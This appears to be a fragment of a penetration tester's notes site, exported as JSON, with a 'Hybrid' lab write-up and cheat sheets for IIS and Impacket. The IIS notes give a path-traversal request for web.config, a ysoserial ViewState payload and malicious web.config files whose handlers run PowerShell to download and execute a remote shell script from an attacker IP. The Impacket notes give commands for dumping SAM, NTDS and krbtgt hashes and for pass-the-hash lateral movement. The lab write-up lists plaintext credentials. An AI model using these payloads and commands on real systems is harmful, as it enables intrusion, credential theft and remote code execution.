111/tcp6  rpcbind\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100000\u003c/span\u003e  3,4          111/udp6  rpcbind\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100003\u003c/span\u003e  3,4         2049/tcp   nfs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100003\u003c/span\u003e  3,4         2049/tcp6  nfs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100005\u003c/span\u003e  1,2,3      33241/tcp6  mountd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100005\u003c/span\u003e  1,2,3      35540/udp6  mountd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100005\u003c/span\u003e  1,2,3      44973/tcp   mountd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100005\u003c/span\u003e  1,2,3      45099/udp   mountd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100021\u003c/span\u003e  1,3,4      33342/udp6  nlockmgr\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100021\u003c/span\u003e  1,3,4      39307/udp   nlockmgr\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100021\u003c/span\u003e  1,3,4      39329/tcp6  nlockmgr\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100021\u003c/span\u003e  1,3,4      42997/tcp   nlockmgr\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100024\u003c/span\u003e  \u003cspan class=\"m\"\u003e1\u003c/span\u003e          39851/tcp6  status\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100024\u003c/span\u003e  \u003cspan class=\"m\"\u003e1\u003c/span\u003e          49837/udp6  status\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100024\u003c/span\u003e  \u003cspan class=\"m\"\u003e1\u003c/span\u003e          52577/tcp   status\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100024\u003c/span\u003e  \u003cspan class=\"m\"\u003e1\u003c/span\u003e          57571/udp   status\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e100227\u003c/span\u003e  \u003cspan class=\"m\"\u003e3\u003c/span\u003e           2049/tcp   nfs_acl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  \u003cspan class=\"m\"\u003e100227\u003c/span\u003e  \u003cspan class=\"m\"\u003e3\u003c/span\u003e           2049/tcp6  nfs_acl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e143/tcp  open  imap     Dovecot imapd \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_imap-capabilities: Pre-login ENABLE capabilities LOGIN-REFERRALS have post-login IDLE listed more OK LITERAL+ IMAP4rev1 LOGINDISABLEDA0001 SASL-IR ID STARTTLS\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003email01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: DNS:mail01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2023-06-17T13:20:17\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2033-06-14T13:20:17\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e587/tcp  open  smtp     Postfix smtpd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e993/tcp  open  ssl/imap Dovecot imapd \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003email01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: DNS:mail01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2023-06-17T13:20:17\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2033-06-14T13:20:17\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_imap-capabilities: Pre-login ENABLE capabilities LOGIN-REFERRALS have post-login IDLE listed more OK LITERAL+ IMAP4rev1 \u003cspan class=\"nv\"\u003eAUTH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eLOGINA0001 SASL-IR ID \u003cspan class=\"nv\"\u003eAUTH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ePLAIN\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e995/tcp  open  ssl/pop3 Dovecot pop3d\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_pop3-capabilities: TOP RESP-CODES USER CAPA AUTH-RESP-CODE SASL\u003cspan class=\"o\"\u003e(\u003c/span\u003ePLAIN LOGIN\u003cspan class=\"o\"\u003e)\u003c/span\u003e PIPELINING UIDL\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003email01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: DNS:mail01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2023-06-17T13:20:17\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2033-06-14T13:20:17\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2049/tcp open  nfs_acl  \u003cspan class=\"m\"\u003e3\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eRPC \u003cspan class=\"c1\"\u003e#100227)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Machine2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eShow mount :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eshowmount -e \u003cspan class=\"nv\"\u003e$t2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eExport list \u003cspan class=\"k\"\u003efor\u003c/span\u003e 10.10.194.198:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/opt/share *\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eSet up :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install nfs-common \u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eMount Share :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo mount -t nfs \u003cspan class=\"nv\"\u003e$t2\u003c/span\u003e:/opt/share /mnt\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eGot some credentials :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eadmin@hybrid.vl:\u003cspan class=\"o\"\u003e{\u003c/span\u003eplain\u003cspan class=\"o\"\u003e}\u003c/span\u003eDuckling21\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epeter.turner@hybrid.vl:\u003cspan class=\"o\"\u003e{\u003c/span\u003eplain\u003cspan class=\"o\"\u003e}\u003c/span\u003ePeterIstToll!\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003ehttps://cyberthint.io/roundcube-markasjunk-command-injection-vulnerability/\u003c/p\u003e","tags":[],"title":"Hybrid"},{"content":"**Exploring Binary Files with path traversal **\nGET /download_page?id=..%2f..%2fweb.config HTTP/1.1 Host: example-mvc-application.minded\rDon't forget to try multiple path traversal like ..../ or \\..\\\nInteresting file : Web.config\nInteresting extension : asp aspx config php\nMicrosoft IIS tilde character “~” Vulnerability/Feature – Short File/Folder Name Disclosure\nDownload the tool: wget https://github.com/irsdl/IIS-ShortName-Scanner\rExploit : java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/\r**ViewState exploitation knowing secrets **\nResources : https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/ https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/\nNeed to read the web.config file:\n\u0026lt;configuration\u0026gt; \u0026lt;system.web\u0026gt; \u0026lt;customErrors mode=\u0026#34;On\u0026#34; defaultRedirect=\u0026#34;default.aspx\u0026#34; /\u0026gt; \u0026lt;httpRuntime targetFramework=\u0026#34;4.5\u0026#34; /\u0026gt; \u0026lt;machineKey decryption=\u0026#34;AES\u0026#34; decryptionKey=\u0026#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43\u0026#34; validation=\u0026#34;SHA1\u0026#34; validationKey=\u0026#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468\u0026#34; /\u0026gt; \u0026lt;/system.web\u0026gt; \u0026lt;system.webServer\u0026gt; \u0026lt;httpErrors\u0026gt; \u0026lt;remove statusCode=\u0026#34;403\u0026#34; subStatusCode=\u0026#34;-1\u0026#34; /\u0026gt; \u0026lt;error statusCode=\u0026#34;403\u0026#34; prefixLanguageFilePath=\u0026#34;\u0026#34; path=\u0026#34;http://dev.pov.htb:8080/portfolio\u0026#34; responseMode=\u0026#34;Redirect\u0026#34; /\u0026gt; \u0026lt;/httpErrors\u0026gt; \u0026lt;httpRedirect enabled=\u0026#34;true\u0026#34; destination=\u0026#34;http://dev.pov.htb/portfolio\u0026#34; exactDestination=\u0026#34;false\u0026#34; childOnly=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/system.webServer\u0026gt; \u0026lt;/configuration\u0026gt;\rDownload YsoSerial : https://github.com/pwntester/ysoserial.net/releases/tag/v1.36\rGenerate the payload : ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \u0026#34;powershell IEX (New-Object Net.WebClient).DownloadString(\u0026#39;http://10.10.15.18:8080/shell.ps1\u0026#39;) \u0026#34; --decryptionalg=\u0026#34;AES\u0026#34; --decryptionkey=\u0026#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43\u0026#34; --validationalg=\u0026#34;SHA1\u0026#34; --validationkey=\u0026#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468\u0026#34; --path=\u0026#34;/portfolio/default.aspx\u0026#34;\r**Not knowing Viewstate secrets **\nResources : https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter Web config file upload : \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;system.webServer\u0026gt; \u0026lt;handlers accessPolicy=\u0026#34;Read, Script, Write\u0026#34;\u0026gt; \u0026lt;add name=\u0026#34;web_config\u0026#34; path=\u0026#34;*.config\u0026#34; verb=\u0026#34;*\u0026#34; modules=\u0026#34;IsapiModule\u0026#34; scriptProcessor=\u0026#34;%windir%\\system32\\inetsrv\\asp.dll\u0026#34; resourceType=\u0026#34;Unspecified\u0026#34; requireAccess=\u0026#34;Write\u0026#34; preCondition=\u0026#34;bitness64\u0026#34; /\u0026gt; \u0026lt;/handlers\u0026gt; \u0026lt;security\u0026gt; \u0026lt;requestFiltering\u0026gt; \u0026lt;fileExtensions\u0026gt; \u0026lt;remove fileExtension=\u0026#34;.config\u0026#34; /\u0026gt; \u0026lt;/fileExtensions\u0026gt; \u0026lt;hiddenSegments\u0026gt; \u0026lt;remove segment=\u0026#34;web.config\u0026#34; /\u0026gt; \u0026lt;/hiddenSegments\u0026gt; \u0026lt;/requestFiltering\u0026gt; \u0026lt;/security\u0026gt; \u0026lt;/system.webServer\u0026gt; \u0026lt;appSettings\u0026gt; \u0026lt;/appSettings\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;% Set obj = CreateObject(\u0026#34;WScript.Shell\u0026#34;) obj.Exec(\u0026#34;cmd /c powershell iex (New-Object Net.WebClient).DownloadString(\u0026#39;http://10.8.3.12:8080/shell.ps1\u0026#39;)\u0026#34;) %\u0026gt;\r\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;location path=\u0026#34;.\u0026#34; inheritInChildApplications=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;system.webServer\u0026gt; \u0026lt;handlers\u0026gt; \u0026lt;add name=\u0026#34;aspNetCore\u0026#34; path=\u0026#34;toto\u0026#34; verb=\u0026#34;*\u0026#34; modules=\u0026#34;AspNetCoreModuleV2\u0026#34; resourceType=\u0026#34;Unspecified\u0026#34; /\u0026gt; \u0026lt;/handlers\u0026gt; \u0026lt;aspNetCore processPath=\u0026#34;cmd.exe\u0026#34; arguments=\u0026#34;/c powershell iex (New-Object Net.WebClient).DownloadString(\u0026#39;http://10.8.3.12:8080/shell.ps1\u0026#39;)\u0026#34; stdoutLogEnabled=\u0026#34;false\u0026#34; stdoutLogFile=\u0026#34;.\\logs\\stdout\u0026#34; hostingModel=\u0026#34;OutOfProcess\u0026#34; /\u0026gt; \u0026lt;/system.webServer\u0026gt; \u0026lt;/location\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4--\u0026gt;\rRessources : https://medium.com/@jeroenverhaeghe/rce-from-web-config-461a5eab8ce9 Fixes Set allowSubDirConfig = false in\nC:\\Windows\\System32\\inetsrv\\Config\\applicationHost.config. This prevents web.config files from being read in subdirectories Remove write permission on the web.config file. Lock sections in the web config ","date":"2023-09-07","id":56,"permalink":"/notes/services/iis/","summary":"\u003cp\u003e**Exploring Binary Files with path traversal **\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGET /download_page?id\u003cspan class=\"o\"\u003e=\u003c/span\u003e..%2f..%2fweb.config HTTP/1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost: example-mvc-application.minded\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003ccode\u003eDon't forget to try multiple path traversal like ..../ or \\..\\\u003c/code\u003e\u003c/p\u003e","tags":[],"title":"IIS"},{"content":" Password must be change smb: smbpasswd -r $domain -U \u0026#39;$user\u0026#39;\rExtract password from SAM \u0026amp; SYSTEM : secretsdump.py -sam SAM.SAV -system SYSTEM.SAV LOCAL\rExtract hash from ntds.dit : secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL\rDump hash with Ccache of krbtgt : export KRB5CCNAME=DC1\\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache secretsdump.py -k DC1.delegate.vl\rEnumerate RPC : samrdump.py \u0026lt;domain\u0026gt;/\u0026lt;username\u0026gt;:\u0026lt;password\u0026gt;@\u0026lt;target_IP\u0026gt;\rEnumerate domain user : GetADUsers.py -all pentesting.local/ippsec:Password12345 -dc-ip 192.168.10.50\rLateral movement : psexec.py -hashes \u0026#39;LMhash:NThash\u0026#39; \u0026#39;DOMAIN/USER@TARGET\u0026#39; smbexec.py -hashes \u0026#39;LMhash:NThash\u0026#39; \u0026#39;DOMAIN/USER@TARGET\u0026#39; wmiexec.py -hashes \u0026#39;LMhash:NThash\u0026#39; \u0026#39;DOMAIN/USER@TARGET\u0026#39; atexec.py -hashes \u0026#39;LMhash:NThash\u0026#39; \u0026#39;DOMAIN/USER@TARGET\u0026#39; dcomexec.py -hashes \u0026#39;LMhash:NThash\u0026#39; \u0026#39;DOMAIN/USER@TARGET\u0026#39;\rFind the right tool : nxc smb 10.10.202.39 --use-kcache -x whoami atexec.py -hashes \u0026#39;:a29542cb2707bf6d6c1d2c9311b0ff02\u0026#39; \u0026#39;ws01\u0026#39;/\u0026#39;Administrator\u0026#39;@\u0026#39;10.10.202.39\u0026#39; whoami\r","date":"2023-09-07","id":57,"permalink":"/notes/ad/tools/impacket/","summary":"\u003cul\u003e\n\u003cli\u003ePassword must be change smb:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esmbpasswd -r \u003cspan class=\"nv\"\u003e$domain\u003c/span\u003e -U \u003cspan class=\"s1\"\u003e\u0026#39;$user\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eExtract password from SAM \u0026amp; SYSTEM :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esecretsdump.py -sam SAM.SAV -system SYSTEM.SAV LOCAL\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eExtract hash from ntds.dit :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esecretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eDump hash with Ccache of krbtgt :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eKRB5CCNAME\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC1\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esecretsdump.py -k DC1.delegate.vl\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eEnumerate RPC :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre 